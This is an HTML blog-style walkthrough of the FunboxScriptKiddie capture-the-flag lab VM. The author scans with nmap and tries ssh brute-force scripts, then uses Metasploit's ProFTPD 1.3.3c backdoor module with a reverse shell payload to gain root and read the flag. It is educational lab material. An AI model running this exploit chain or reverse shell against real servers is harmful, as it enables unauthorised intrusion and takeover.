        <h1>FunboxScriptKiddie CTF</h1>
        <p class="paragraph-spacing">
            Hi everyone! This is my first Virtual Box CTF, FunboxScriptKiddie. 
            A co-worker recommended it to me, and I found it really fun to complete.
        </p>
        
        <h2>Finding the Box</h2>
        <p class="paragraph-spacing">Here’s what I needed for this challenge:</p>
        <ul class="no-bullets">
            <li>1. Oracle VMbox</li>
            <li>2. Kali installed on Oracle VMbox</li>
            <li>3. FunboxScriptKiddie Box on Oracle VMbox</li>
        </ul>
        
        <p class="paragraph-spacing">
            I started by downloading the two virtual boxes onto my laptop and VMware. 
            I'm using Oracle VMware Box. I went into each VMbox setting and connected 
            both boxes to the same NAT Network. If you're unsure how to do this, click here.
        </p>
        
        <p class="paragraph-spacing">
            Once everything was set up, I powered on both the Kali machine and the 
            FunboxScriptKiddie machine.
        </p>

        <p class="paragraph-spacing">
            After logging into Kali, I ran an <span class="italic bold">ifconfig</span> 
            command to see what was connected to the network. Then, I used the 
            <span class="italic bold">nmap -sV (type your network here)/24</span> 
            command to scan all devices on the NAT network. This showed that the 
            Funbox machine was located at 10.0.2.7.
        </p>

        <script src="funboxscriptkiddie.js" defer></script>
        <div id="Nmap scan"></div>

        <p class="paragraph-spacing">
            The Nmap scan also revealed several open ports on this IP. Based on 
            previous experience, I decided to target the open SSH port first. To 
            look for vulnerabilities in this specific SSH version, I used the command 
            <span class="italic bold">nmap -p 22 --script ssh* 10.0.2.7</span>.
        </p>

        <script src="FunboxScriptKiddie.js" defer></script>
        <div id="nmap brute force"></div>

        <p class="paragraph-spacing">
            The Nmap script used a brute force attack with a password manager. 
            Since brute force attacks rely on password complexity, and this script 
            only tested 3071 combinations, I didn’t gain much. However, I did gather 
            some useful information about weak encryption algorithms.
        </p>

        <p class="paragraph-spacing">
            I moved on to the open FTP port. To exploit the FTP I launched Metasploit with the 
            <span class="italic bold">msfconsole</span> command. The Nmap scan showed 
            that the Funbox server was using a FTP version called ProFTPD 1.3.3c. I searched for exploits 
            using the command <span class="italic bold">search proftpd 1.3.3c</span>.
        </p>

        <script src="FunboxScriptKiddie.js" defer></script>
        <div id="msfconsole screenshot"></div>

        <p class="paragraph-spacing">
            The command found a backdoor exploit. I went ahead and used the exploit 
            <span class="italic bold">use exploit/unix/ftp/proftpd_133c_backdoor</span>. 
            Then, I set the target server with 
            <span class="italic bold">set RHOST 10.0.2.7</span> and configured a reverse 
            shell payload using <span class="italic bold">set payload /cmd/unix/reverse</span>. 
            Finally, I set my local host with 
            <span class="italic bold">set LHOST (your machine IP)</span> and executed the 
            attack with <span class="italic bold">exploit</span>.
        </p>

        <script src="FunboxScriptKiddie.js" defer></script>
        <div id="msfconsole 2"></div>

        <p class="paragraph-spacing">
            Once inside, I used the <span class="italic bold">whoami</span> command to 
            confirm access.
        </p>

        <script src="FunboxScriptKiddie.js" defer></script>
        <div id="whoami"></div>

        <p class="paragraph-spacing">
            Not only where we able to gain access but it seems as if we've gained root access, this could make this a whole lot easier.
            With root access, I listed the directories on the server using 
            the <span class="italic bold">ls</span> command. One directory that caught 
            my attention was the root directory, as it often contains critical files.
        </p>

        <script src="FunboxScriptKiddie.js" defer></script>
        <div id="lscom"></div>

        <p class="paragraph-spacing">
            I navigated to the root directory using <span class="italic bold">cd root</span>. 
            Once there, I ran <span class="italic bold">ls</span> again to see its contents. 
            Inside, I found a file named <span class="italic bold">root.txt</span>.
        </p>

        <script src="FunboxScriptKiddie.js" defer></script>
        <div id="cd root"></div>

        <p>
            To read the file, I used the command 
            <span class="italic bold">cat root.txt</span>. And just like that, I had 
            successfully found the flag for this CTF!
        </p>
